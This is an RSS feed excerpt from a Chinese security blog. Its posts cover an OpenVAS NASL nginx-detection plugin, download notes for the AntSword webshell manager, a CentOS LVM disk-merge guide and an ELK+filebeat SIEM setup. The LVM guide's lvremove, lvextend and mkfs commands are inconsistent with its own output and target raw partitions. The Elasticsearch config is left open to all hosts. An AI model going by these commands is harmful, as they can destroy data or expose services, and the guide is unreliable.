–rebuild<br>注意：参数“rebuild”代表从一个正在运行的扫描器（openvassd）中重建数据库信息。</p><p>http请求：</p><pre><code>port = get_http_port(default:80);  host = http_host_name(port:port);  recv = http_get(port:port, item:&quot;/&quot;);  display(recv,&quot;\n&quot;);  </code></pre><p>参考：</p><p><a href="https://zhuanlan.zhihu.com/p/81149159">nasl插件详解</a></p><p><a href="http://books.gigatux.nl/mirror/networksecuritytools/0596007949/toc.html">nessus的nasl脚本手册</a></p><p><a href="http://michel.arboi.free.fr/nasl2ref/nasl2_reference.pdf">nasl官方手册</a></p><p><a href="http://nasl.homemoon.top/index.html">nasl插件开发手册-翻译版</a>  比较全</p><p><a href="http://nasl.homemoon.top/index.html">Nessus安全测试插件编写教程</a>     入门教程</p><h4 id="识别nginx的插件"><a href="#识别nginx的插件" class="headerlink" title="识别nginx的插件"></a>识别nginx的插件</h4><p>插件脚本：</p><pre><code>################################################################################ OpenVAS Vulnerability Test## Nginx version page## Authors:# molly.zhang &lt;molly.zhang@alussinan.org&gt;## Copyright:# Copyright (C) 2021 molly zhang## This program is free software; you can redistribute it and/or modify# it under the terms of the GNU General Public License version 2,# as published by the Free Software Foundation## This program is distributed in the hope that it will be useful,# but WITHOUT ANY WARRANTY; without even the implied warranty of# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the# GNU General Public License for more details.## You should have received a copy of the GNU General Public License# along with this program; if not, write to the Free Software# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.###############################################################################if(description)&#123;  script_oid(&quot;1.3.6.1.4.1.56487.1.0.75984&quot;);  script_version(&quot;2021-04-24T15:18:35+0000&quot;);  script_tag(name:&quot;last_modification&quot;, value:&quot;2021-05-08 15:18:35 +0000 (Sat, 08 May 2021)&quot;);  script_tag(name:&quot;creation_date&quot;, value:&quot;2021-05-08 14:08:04 +0100 (Sat, 08 May 2021)&quot;);  script_tag(name:&quot;cvss_base_vector&quot;, value:&quot;AV:N/AC:L/Au:N/C:N/I:N/A:N&quot;);  script_tag(name:&quot;cvss_base&quot;, value:&quot;5.3&quot;);  script_name(&quot;Nginx version&quot;);  script_category(ACT_GATHER_INFO);  script_copyright(&quot;Copyright (C)：mengli.zhang in 20210507&quot;);  script_family(&quot;MyNVTS&quot;);  script_dependencies(&quot;find_service.nasl&quot;, &quot;httpver.nasl&quot;, &quot;global_settings.nasl&quot;);  script_require_ports(&quot;Services/www&quot;, 80);  script_exclude_keys(&quot;Settings/disable_cgi_scanning&quot;);  script_add_preference(name:&quot;Show full HTTP headers in output&quot;, type:&quot;checkbox&quot;, value:&quot;no&quot;, id:1);  script_tag(name:&quot;summary&quot;, value:&quot;This script detects and reports the Nginx&#39;s Version.&quot;);  script_tag(name:&quot;qod_type&quot;, value:&quot;remote_banner&quot;);  exit(0);&#125;display(&quot;Hello World .\n&quot;);display(&quot;Hello World openvas-nasl. \n&quot;);include(&#39;/var/lib/openvas/plugins/http_func.inc&#39;);include(&#39;/var/lib/openvas/plugins/global_settings.inc&#39;);#display(default:80,&quot;\n&quot;);#port = get_http_port(default:80);#host = http_host_name(port:port);display(&quot;start#########\n&quot;);#display(host,&quot;\n&quot;);#recv = http_send_recv(port: port, data: str);#str = string(&quot;GET /index.php HTTP/1.0\r\n\r\n&quot;);str = string(&quot;GET / HTTP/1.0\r\n\r\n&quot;);recv = http_send_recv(port: &quot;80&quot;,data:str);display(recv, &quot;\n&quot;);state = egrep(pattern:&#39;nginx.*&#39;,string:recv);display(&quot;state:&quot;,state);if(state)&#123;  display(&#39;nginx version xielou\n&#39;);&#125;exit( 0 );</code></pre><p> openvasmd –rebuild –progress </p><p>测试：</p><pre><code>openvas-nasl -Xt 10.27.22.76 nginx_version.nasl</code></pre><pre><code>docker exec -it 337e5d6c9854 bashcd /usr/local/var/lib/openvas/pluginsvim nginx_version.naslcat nginx_version.naslopenvas-nasl -Xt 10.27.22.76 nginx_version.nasl</code></pre><p>[root@archery-sec9002 supper-user]# docker restart 337e5d6c9854</p><p>重启openvas</p><pre><code>#加载插件openvassd#### 8. 重建插件库openvasmd –rebuild#失败　　这一步成功会在/usr/local/var/cache/openvas 中生成.nvti 文件因为openvasmd，gvmd自GVM-10起，它已重命名为：gvmd，并且openvas-check-setup已弃用且无用。gvmd --rebuild-scap=ovaldefsdocker restart 337e5d6c9854</code></pre><p>sudo service openvas-manager restart; </p><p>sudo service openvas-scanner restart; </p><p>sudo openvasmd –rebuild –progress </p><p>family=”Web application abuses”</p><p>family=”MyNVTs”</p><p>family=”Policy”</p><p>greenbone-nvt-sync –rsync     #greenbone-nvt-sync –curl<br>greenbone-scapdata-sync –rsync</p><p>greenbone-certdata-sync –rsync</p><p>查看日志：</p><p>cat /usr/local/var/log/gvm/openvassd.log</p><p>cat /usr/local/var/log/gvm/gvmd.log</p><p>docker查看日志</p><p>[root@archery-sec9002 supper-user]# docker logs openvas0127</p><p>可以通过运行以下命令来查看/ var / log / gvm / *中的所有日志：</p><pre><code>docker logs openvas</code></pre><p><img src="/2021/04/07/openvas-develop/1620456185130.png" alt="1620456185130"></p><pre><code>md   main:MESSAGE:2021-05-08 03h28.04 utc:32273:    Greenbone Vulnerability Manager version 8.0.2 (DB revision 205)md   main:WARNING:2021-05-08 03h28.04 utc:32273: main: Main process is already runningmd   main:MESSAGE:2021-05-08 03h29.24 utc:32318:    Greenbone Vulnerability Manager version 8.0.2 (DB revision 205)md manage:   INFO:2021-05-08 03h29.24 utc:32318:    Rebuilding SCAP data (ovaldefs).md manage:WARNING:2021-05-08 03h29.26 utc:32318: sql_prepare_internal: sqlite3_prepare failed: no such column: idmd manage:WARNING:2021-05-08 03h29.26 utc:32318: sqlv: sql_prepare_internal failedmd   main:MESSAGE:2021-05-08 03h32.42 utc:15:    Greenbone Vulnerability Manager version 8.0.2 (DB revision 205)md   main:   INFO:2021-05-08 03h32.42 utc:15:    Migrating database.md   main:WARNING:2021-05-08 03h32.42 utc:15: main: databases are already at the supported versionmd   main:MESSAGE:2021-05-08 03h32.42 utc:17:    Greenbone Vulnerability Manager version 8.0.2 (DB revision 205)md manage:   INFO:2021-05-08 03h32.42 utc:17:    Getting users.md   main:MESSAGE:2021-05-08 03h33.48 utc:26:    Greenbone Vulnerability Manager version 8.0.2 (DB revision 205)util gpgme:MESSAGE:2021-05-08 03h33.48 utc:27: Setting GnuPG dir to &#39;/usr/local/var/lib/gv</code></pre><p>greenbone-nvt-sync –help</p><p>greenbone-nvt-sync –refresh</p><p>gvmd -h</p><p>openvassd -h</p>]]></content:encoded>
      
      
      
      
      <comments>https://m01ly.github.io/2021/04/07/openvas-develop/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>渗透测试工具之蚁剑</title>
      <link>https://m01ly.github.io/2021/03/30/pt-antSword/</link>
      <guid>https://m01ly.github.io/2021/03/30/pt-antSword/</guid>
      <pubDate>Tue, 30 Mar 2021 06:58:08 GMT</pubDate>
      
      <description>&lt;p&gt;首先蚁剑的下载地址：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/AntSwordProject/antSword&quot;&gt;https://github.com/AntSwordProject/antSword&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;其次需要注意：&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>首先蚁剑的下载地址：</p><p><a href="https://github.com/AntSwordProject/antSword">https://github.com/AntSwordProject/antSword</a></p><p>其次需要注意：<a id="more"></a></p><p>在GitHub下载时需要下载两个部分：</p><p>一个是项目核心源码（AntSword），另一个是加载器（AntSword-Loader）；</p><p>加载器则分为三个版本：Mac、Windows、Linux。</p><p>核心源码：</p><p>这个其实就是运行加载其中的exe文件后，选择了工作目录后下载到工作目录里面的zip文件。</p><p>也可以自己去github下载<a href="https://github.com/AntSwordProject/antSword">https://github.com/AntSwordProject/antSword</a><br>————————————————<br>版权声明：本文为CSDN博主「Ahuuua」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/Ahuuua/article/details/109034528">https://blog.csdn.net/Ahuuua/article/details/109034528</a></p><p><img src="/2021/03/30/pt-antSword/1617087539177.png" alt="1617087539177"></p><p>工作目录可以选择antSword-master，然后加载代码成功，手动重启即可。</p>]]></content:encoded>
      
      
      
      
      <comments>https://m01ly.github.io/2021/03/30/pt-antSword/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>centos7把/mnt空间合并到/(根目录)</title>
      <link>https://m01ly.github.io/2021/03/11/linux-disk/</link>
      <guid>https://m01ly.github.io/2021/03/11/linux-disk/</guid>
      <pubDate>Thu, 11 Mar 2021 07:17:19 GMT</pubDate>
      
      <description>&lt;p&gt;在使用虚拟机创建centos系统的时候,会发现原本打算分配的空间,有一部分给/mnt分配走了,这样就造成我们的根目录空间不够,所以我们要把/mnt分配走的空间还给根目录.&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>在使用虚拟机创建centos系统的时候,会发现原本打算分配的空间,有一部分给/mnt分配走了,这样就造成我们的根目录空间不够,所以我们要把/mnt分配走的空间还给根目录.</p><a id="more"></a><p>1.先查看空间分配情况</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">df</span> -h<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到整个硬盘近250G，但是根目录只用了50G，mnt目录用了197G。</p><p><img src="/2021/03/11/linux-disk/1615447144928.png" alt="1615447144928"></p><p>2.卸载/mnt分区</p><p>（1）#备份/mnt没东西可以不备份 </p><pre><code> tar cvf /tmp/mnt.tar /mnt  tar cvf /tmp/root.tar / </code></pre><p>（2）卸载mnt目录</p><p> # 记录一下 mnt下有多少可用空间  ，比如197G </p><pre><code>umount /mnt    #卸载/mnt，如果无法卸载，先终止使用/home文件系统的进程mount /dev/sdb1 /mntmount /dev/sdb1 /mnt</code></pre><p>（3）删除/mnt所在的lv</p><pre><code>lvremove /dev/sdb1</code></pre><p>接着会出现确认的内容，输入“y”，回车</p><p>Do you really want to remove active logical volume centos/home? [y/n]: y</p><p> Logical volume “home” successfully removed</p><p>（4）查看物理卷情况：查看剩余空间</p><pre><code>vgdisplay</code></pre><p> — Volume group —</p><p> VG Name        centos</p><p> System ID</p><p> Format        lvm2</p><p> Metadata Areas    1</p><p> Metadata Sequence No 5</p><p> VG Access       read/write</p><p> VG Status       resizable</p><p> MAX LV        0</p><p> Cur LV        2</p><p> Open LV        2</p><p> Max PV        0</p><p> Cur PV        1</p><p> Act PV        1</p><p> VG Size        &lt;59.00 GiB</p><p> PE Size        4.00 MiB</p><p> Total PE       15103</p><p> Alloc PE / Size    10473 / 40.91 GiB</p><p> Free PE / Size    4630 / &lt;18.09 GiB</p><p> VG UUID        damgP3-SFOn-9IfM-k4bX-B2g1-D3HG-otTWEd</p><p> ps:</p><p> 查看 Free PE / Size这项,可以看到还有18.09G可以分配,但我们实际只能分配18G.</p><p>（5）扩展/root所在的lv</p><pre><code>lvextend -L +100G /dev/sda1</code></pre><p> Size of logical volume centos/root changed from &lt;37.04 GiB (9481 extents) to &lt;55.04 GiB (14089 extents).</p><p> Logical volume centos/root successfully resized.</p><p>（6）扩展/root文件系统</p><pre><code>xfs_growfs /dev/sda1</code></pre><p>（7）检查是否成功</p><pre><code>df -h</code></pre><p>3 处理mnt目录</p><p>（1）创建</p><pre><code>lvcreate -L 40G -n /dev/sdb1</code></pre><p> 或加入剩余空间 vgdisplay</p><p>lvdisplay 查看 VG Name        cl </p><p> lvcreate -l +100%FREE -n /dev/mapper/cl-home cl</p><p>（2）进行创建文件系统</p><pre><code>mkfs.xfs  /dev/sdb1mkfs.xfs  /dev/mapper/centos-home </code></pre><p>（3）我们就要把mnt目录挂载回去</p><p>mount /dev/sdb1</p><p>最后把之前home备份到tmp的内容，给mv回来，mnt目录的恢复</p><p> 解压 ：tar xvf /tmp/mnt.tar  -C /mnt/   </p><p>我们解压在mnt所以要进入mnt目录 ：cd /mnt/mnt/   </p><p>最后一条：mv * ../</p><p>然后你在敲df -h，就可以看到现在的系统状态，大功告成！</p>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/linux/">linux</category>
      
      
      <comments>https://m01ly.github.io/2021/03/11/linux-disk/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>elk笔记三--利用elk+filebeat搭建SIEM系统</title>
      <link>https://m01ly.github.io/2021/02/19/install-guide-elk-filebeats/</link>
      <guid>https://m01ly.github.io/2021/02/19/install-guide-elk-filebeats/</guid>
      <pubDate>Fri, 19 Feb 2021 08:49:12 GMT</pubDate>
      
      <description>&lt;h1 id=&quot;1-整体架构部署&quot;&gt;&lt;a href=&quot;#1-整体架构部署&quot; class=&quot;headerlink&quot; title=&quot;1 整体架构部署&quot;&gt;&lt;/a&gt;1 整体架构部署&lt;/h1&gt;&lt;p&gt;SIEM全称为security information and event management，即安全信息和事件管理，通俗使用的说，安全信息指的是服务运行中产生的日志信息，事件管理即通过对安全信息进行各种分析方法的总称，如入侵检测等。目前我司一个项目中客户要求SIEM系统，最常见的采用elk+filebeat搭建SIEM系统，用来分析服务器产生的日志：其实初步只做到了安全信息管理，后面如果深入我会继续更新。下面先看下部署的整体架构：filebeat部署在哥哥需要收集日志的机器上，然后在云上部署elk系统，然后filebeat将日志传送到logstash中，然后logstash存到es中，进一步通过kibana进行数据化展示。&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="1-整体架构部署"><a href="#1-整体架构部署" class="headerlink" title="1 整体架构部署"></a>1 整体架构部署</h1><p>SIEM全称为security information and event management，即安全信息和事件管理，通俗使用的说，安全信息指的是服务运行中产生的日志信息，事件管理即通过对安全信息进行各种分析方法的总称，如入侵检测等。目前我司一个项目中客户要求SIEM系统，最常见的采用elk+filebeat搭建SIEM系统，用来分析服务器产生的日志：其实初步只做到了安全信息管理，后面如果深入我会继续更新。下面先看下部署的整体架构：filebeat部署在哥哥需要收集日志的机器上，然后在云上部署elk系统，然后filebeat将日志传送到logstash中，然后logstash存到es中，进一步通过kibana进行数据化展示。<a id="more"></a></p><p><img src="/2021/02/19/install-guide-elk-filebeats/1614853265381.png" alt="1614853265381"></p><p>其中涉及的部署主机如下：</p><table><thead><tr><th>部署用途</th><th>主机</th><th>域名</th><th>环境</th></tr></thead><tbody><tr><td>日志产生集群:部署filebeat7.8</td><td>10.65.18.105等</td><td>archery-sec0001.xxx.xx</td><td>centos7</td></tr><tr><td>SIEM系统：部署elk7.8</td><td>10.65.18.112</td><td>archery-sec0002.xxx.xx</td><td>centos7，java8</td></tr></tbody></table><h1 id="2-elk安装"><a href="#2-elk安装" class="headerlink" title="2 elk安装"></a>2 elk安装</h1><p>在10.65.18.112主机上部署elk。其中安装elk教程参考<a href="https://m01ly.github.io/2020/09/11/install-guide-elk-suricata">前面一篇文章</a>即可写的较详细，这里直接列出关键命令。</p><h2 id="2-1-elasticsearch9200"><a href="#2-1-elasticsearch9200" class="headerlink" title="2.1 elasticsearch9200"></a>2.1 elasticsearch9200</h2><p>注意安装ES时候，需要java8的环境。</p><p>安装目录： 一般是装在/usr/share/elasticsearch/下 </p><p>path.data: /var/lib/elasticsearch</p><p>path.logs: /var/log/elasticsearch</p><p><strong>（0）安装1.8版本java</strong></p><p>执行下面命令进行安装1.8jdk。这里有个地方要注意，要选择 要带有-devel的安装，因为这个安装的是jdk，而那个不带-devel的安装完了其实是jre。</p><pre class="line-numbers language-bash"><code class="language-bash">yum <span class="token function">install</span> -y java-1.8.0-openjdk-devel.x86_64java -version<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p> <strong>（1）下载安装es</strong> </p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">wget</span> https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-7.8.0-x86_64.rpmrpm -ivh elasticsearch-7.8.0-x86_64.rpm<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p> <strong>(2) 配置文件</strong> </p><pre class="line-numbers language-bash"><code class="language-bash">vim /etc/elasticsearch/elasticsearch.yml<span class="token comment" spellcheck="true">#修改默认配置</span><span class="token function">egrep</span> -v <span class="token string">"^#|^$"</span> /etc/elasticsearch/elasticsearch.yml<span class="token comment" spellcheck="true">#设置内存不使用交换分区</span>bootstrap.memory_lock: <span class="token boolean">false</span><span class="token comment" spellcheck="true">#配置了bootstrap.memory_lock为true时反而会引发9200不会被监听，原因不明</span><span class="token comment" spellcheck="true">#设置允许所有ip可以连接该elasticsearch</span>network.host: 0.0.0.0<span class="token comment" spellcheck="true">#开启监听的端口为9200</span>http.port: 9200http.cors.enabled: <span class="token boolean">true</span>http.cors.allow-origin: <span class="token string">"*"</span><span class="token comment" spellcheck="true">##防止bootstrap报错</span>node.name: node-1bootstrap.system_call_filter: <span class="token boolean">false</span> cluster.initial_master_nodes: <span class="token punctuation">[</span><span class="token string">"node-1"</span><span class="token punctuation">]</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>（3）启动es</strong></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> systemctl <span class="token function">enable</span> elasticsearch <span class="token comment" spellcheck="true">#设置开机启动</span><span class="token function">sudo</span> systemctl start elasticsearch <span class="token comment" spellcheck="true">#启动</span><span class="token function">sudo</span> systemctl status elasticsearch <span class="token comment" spellcheck="true">#启查看运行状态</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>（4）测试是否启动成功</strong></p><pre class="line-numbers language-bash"><code class="language-bash">curl -X GET http://localhost:9200 <span class="token comment" spellcheck="true">#测试服务是否开启 可以用IP或者域名</span>curl -X GET http://archery-sec0002.eniot.io:9200/curl -X GET http://10.65.18.112:9200/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2021/02/19/install-guide-elk-filebeats/1613724861443.png" alt="1613724861443"></p><h2 id="2-2-logstash安装5044"><a href="#2-2-logstash安装5044" class="headerlink" title="2.2 logstash安装5044"></a>2.2 logstash安装5044</h2><p> <strong>(1)下载安装</strong> </p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">wget</span> https://artifacts.elastic.co/downloads/logstash/logstash-7.8.0.rpmrpm -ivh logstash-7.8.0.rpm<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p> <strong>(2)配置文件</strong><br>这里注意将output下的hosts改为刚才ES的IP地址即可。 </p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cd</span> /etc/logstash<span class="token comment" spellcheck="true">#进入logstash目录 </span><span class="token function">vi</span> /etc/logstash/conf.d/logstash.conf<span class="token comment" spellcheck="true">#创建配置文件，日志内容输出到elasticsearch中</span>input <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>    stdin <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;&amp;#125;</span>    beats <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>        port <span class="token operator">=</span><span class="token operator">></span> 5044    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>output <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>    elasticsearch <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>        hosts <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">[</span><span class="token string">"10.65.18.112:9200"</span><span class="token punctuation">]</span>  <span class="token comment" spellcheck="true">#es主机</span>        index <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"filebeats-%&amp;#123;+YYYY.MM.dd&amp;#125;"</span>    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>    stdout <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>        codec <span class="token operator">=</span><span class="token operator">></span> rubydebug    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> <strong>（3）启动</strong> </p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">nohup</span> /usr/share/logstash/bin/logstash -f /etc/logstash/conf.d/logstash.conf <span class="token operator">&amp;</span> <span class="token comment" spellcheck="true">#指定logstash.conf配置文件，以后台的方式运用</span><span class="token function">ps</span> -ef<span class="token operator">|</span><span class="token function">grep</span> logstash <span class="token comment" spellcheck="true">#查看logstash服务</span><span class="token function">kill</span> -9 pid<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>这里注意：如果直接运行systemctl start logstash命令启动logstash，不会加载logstash.conf配置文件。</strong></p><h2 id="2-3-kibana安装5601"><a href="#2-3-kibana安装5601" class="headerlink" title="2.3 kibana安装5601"></a>2.3 kibana安装5601</h2><p><strong>（1）下载安装</strong> </p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">wget</span> https://artifacts.elastic.co/downloads/kibana/kibana-7.8.0-x86_64.rpmrpm -ivh kibana-7.8.0-x86_64.rpm<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p> <strong>（2）配置文件</strong><br>注意将配置文件中的kibana.yml设置在为ES地址。 </p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">vi</span> /etc/kibana/kibana.yml <span class="token function">egrep</span> -v <span class="token string">"^#|^$"</span> /etc/kibana/kibana.yml<span class="token comment" spellcheck="true">#kibana页面映射在5601端口 </span>server.port: 5601 <span class="token comment" spellcheck="true">#允许所有ip访问5601端口 </span>server.host: <span class="token string">"0.0.0.0"</span> <span class="token comment" spellcheck="true">#elasticsearch所在的ip及监听的地址 </span>elasticsearch.hosts: <span class="token punctuation">[</span><span class="token string">"http://10.65.18.112:9200"</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> <strong>（3）启动</strong> </p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> systemctl <span class="token function">enable</span> kibana <span class="token comment" spellcheck="true">#设置开机启动</span><span class="token function">sudo</span> systemctl start kibana <span class="token comment" spellcheck="true">#启动</span><span class="token function">sudo</span> systemctl status kibana <span class="token comment" spellcheck="true">#启查看运行状态</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p> <strong>（4）浏览器查看</strong></p><p>浏览器输入IP:5601或者域名:5601即可查看kibana，例如<a href="http://archery-sec0002.eniot.io:5601/">http://archery-sec0002.eniot.io:5601/</a> </p><h1 id="3-部署filebeat"><a href="#3-部署filebeat" class="headerlink" title="3 部署filebeat"></a>3 部署filebeat</h1><p>在10.65.18.105主机上部署filebeat，具体如下：</p><p><strong>（1）下载安装</strong></p><pre class="line-numbers language-yaml"><code class="language-yaml">sudo wget https<span class="token punctuation">:</span>//artifacts.elastic.co/downloads/beats/filebeat/filebeat<span class="token punctuation">-</span>7.8.0<span class="token punctuation">-</span>x86_64.rpmrpm <span class="token punctuation">-</span>ivh filebeat<span class="token punctuation">-</span>7.8.0<span class="token punctuation">-</span>x86_64.rpm<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>(2)配置filebeat，将日志输出到logstash</strong></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">vi</span> /etc/filebeat/filebeat.yml <span class="token function">egrep</span> -v <span class="token string">"^#|^$"</span> /etc/filebeat/filebeat.yml<span class="token comment" spellcheck="true">#=========================== Filebeat prospectors =============================</span>filebeat.inputs:- type: log  <span class="token comment" spellcheck="true"># Change to true to enable this input configuration.</span>  enabled: <span class="token boolean">true</span>  <span class="token comment" spellcheck="true"># Paths that should be crawled and fetched. Glob based paths.</span>  paths:    - /var/log/*.log<span class="token comment" spellcheck="true">#这里配置指定目录的日志</span>    <span class="token comment" spellcheck="true">#- c:\programdata\elasticsearch\logs\*</span><span class="token comment" spellcheck="true">#----------------------------- Logstash output --------------------------------</span>output.logstash:  <span class="token comment" spellcheck="true"># The Logstash hosts</span>  <span class="token comment" spellcheck="true">#hosts: ["localhost:5044"]</span>  hosts: <span class="token punctuation">[</span><span class="token string">"archery-sec0002.eniot.io:5044"</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">#这里配置logstash地址，如果是内网最好用域名访问</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>（3） 启动filebeat</strong></p><p>运行如下命令启动filebeat</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> systemctl <span class="token function">enable</span> filebeat<span class="token comment" spellcheck="true">#设置开机启动</span><span class="token function">sudo</span> systemctl start filebeat<span class="token comment" spellcheck="true">#启动</span><span class="token function">sudo</span> systemctl status filebeat<span class="token comment" spellcheck="true">#启查看运行状态</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>(4) 查看日志</strong></p><p>如果filebeat可以用systemctl启动成功,则执行下面命令可以看到file beat运行日志，</p><pre class="line-numbers language-bash"><code class="language-bash">systemctl status filebeat -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果启动不成功，<a href="https://www.cnblogs.com/FengGeBlog/p/10644170.html">有以下两种方法：</a> </p><p>1、查看Linux的rsyslog日志，也就是/var/log/messages这个文件，这个文件日志量比较大，最好使用less命令查看此文件，然后按下大写字母G可翻阅到文件的最后的内容，最后查看是否有关于filebeat的报错语句。</p><p>2、直接使用filebeat的启动方法，而不使用systemctl start filebeat来启动。比如：</p><pre class="line-numbers language-bash"><code class="language-bash">/usr/share/filebeat/bin/filebeat -c /etc/filebeat/filebeat.yml -path.home /usr/share/filebeat -path.config /etc/filebeat -path.data /var/lib/filebeat -path.logs /var/log/filebeat<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我这次就是直接使用这个命令，给我报错是127行有问题，然后</p><pre class="line-numbers language-bash"><code class="language-bash"> <span class="token function">cat</span> -n  /etc/filebeat/filebeat.yml <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我就着重修改了一下，最后启动成功了。</p><h1 id="4-启动"><a href="#4-启动" class="headerlink" title="4  启动"></a>4  启动</h1><p>首先开启elk,然后在部署filebeat的主机上（10.65.18.105）输入如下命令：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">echo</span> <span class="token string">"删除用户"</span> <span class="token operator">>></span> /var/log/admin.log <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>浏览器输入：ip/域名：5601，可以在Stack Management–&gt;Index Management下看到该index，filebeat-20210304，即证明filebeat将日志传送到elk上成功了。</p><p><img src="/2021/02/19/install-guide-elk-filebeats/1614854689893.png" alt="1614854689893"></p><p>还可以去Dev Tools搜索相关数据</p><p><img src="/2021/02/19/install-guide-elk-filebeats/1614852084050.png" alt="1614852084050"></p><p><img src="/2021/02/19/install-guide-elk-filebeats/1614852141941.png" alt="1614852141941"></p><h1 id="5-配置多目录收集"><a href="#5-配置多目录收集" class="headerlink" title="5 配置多目录收集"></a>5 配置多目录收集</h1><p>在实际的应用中，filebeat不只需要收集一个目录的日志，这个时候就需要用配置filebeat的多目录收集，本文参考<a href="https://blog.csdn.net/vip100549/article/details/79657574">使用Filebeat 6 收集多个目录的日志并发送到lostash</a> 配置两个主要目录收集日志，一个是收集系统日志的/var/log/*.log，一个是收集应用产生的日志/root/FEP/，主要配置如下：并且用Tags进行标记区分。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">vi</span> /etc/filebeat/filebeat.yml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-yml"><code class="language-yml"> filebeat.prospectors:- type: log  # Change to true to enable this prospector configuration.  enabled: true  # Paths that should be crawled and fetched. Glob based paths.  paths:    - /var/log/*.log  tags: ["systemlog"]- type: log  enabled: true  paths:    - /home/envuser/energy-os/*/logs/*.log  tags: ["applicationlog"]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>生产的日志可以用tags字段进行区分搜索(建立index-pattern-&gt;discover就可以看到)，如下图所示：</p><p><img src="/2021/02/19/install-guide-elk-filebeats/1615880675461.png" alt="1615880675461"></p><h1 id="5-ES设置登录"><a href="#5-ES设置登录" class="headerlink" title="5 ES设置登录"></a>5 ES设置登录</h1><p>ES默认是没有加认证的，因此外界可以直接访问地址获取数据库信息，造成隐私泄露，这里我们采用X-pack为ES加上登录，具体操作可参考<a 